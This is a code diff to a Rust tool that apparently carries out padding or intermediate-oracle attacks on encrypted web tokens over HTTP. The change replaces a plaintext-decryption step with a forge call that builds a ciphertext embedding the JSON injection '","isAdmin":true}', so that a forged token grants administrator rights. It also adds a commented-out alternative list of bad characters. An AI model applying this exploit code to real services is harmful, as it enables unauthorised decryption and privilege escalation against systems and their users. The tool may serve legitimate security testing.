@@ -7,7 +7,7 @@ use strum_macros::Display;
 use tokio::{sync::mpsc, time::sleep};
 
 use reqwest::{ Method};
-use crate::{crypt::{cradlehelpers::{ComputeCache, build_cradle, decrypt_intermediate_block}, detector::{Detector, IntermediateDetector}}, helper::{Config, Encoding}, oracle::{IntermediateOracle, Oracle}, print::fmt_bytes_custom, transport::HTTPTransport};
+use crate::{crypt::{cradlehelpers::{ComputeCache, build_cradle, decrypt_intermediate_block}, detector::{Detector, IntermediateDetector}}, helper::{Config, Encoding, encode_ct}, oracle::{IntermediateOracle, Oracle}, print::fmt_bytes_custom, transport::HTTPTransport};
 
 pub mod crypt;
 pub mod errors;
@@ -145,12 +145,18 @@ async fn main() {
         if let Ok(detector) = detect{
             println!("Intermediate Oracle Detected");
             let bad_chars = vec![ 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11,0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x22];
+            //let bad_chars = vec![ 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc,0xfd,0xfe,0xff];
             let (tx, rx) = mpsc::channel(255);
             let intermediate_oracle = IntermediateOracle::new(detector, tx, *block_size as usize, &bad_chars);
-            let pt = intermediate_oracle.decrypt(&standard_ct).await;
-            if let Ok(pt) = pt{
-                println!("plaintext {:?}", fmt_bytes_custom(&pt));
+            //let pt = intermediate_oracle.decrypt(&standard_ct).await;
+            // if let Ok(pt) = pt{
+            //     println!("plaintext {:?}", fmt_bytes_custom(&pt));
+            // }
+            let ct = intermediate_oracle.forge(&standard_ct, "hello world!\",\"isAdmin\":true}".as_bytes()).await;
+            if let Ok(ct) = ct{
+                println!("{:?}",encode_ct(&ct, encoding.clone()));
             }
+            
         }else{
             println!("No Intermediate Oracle Detected");
         }
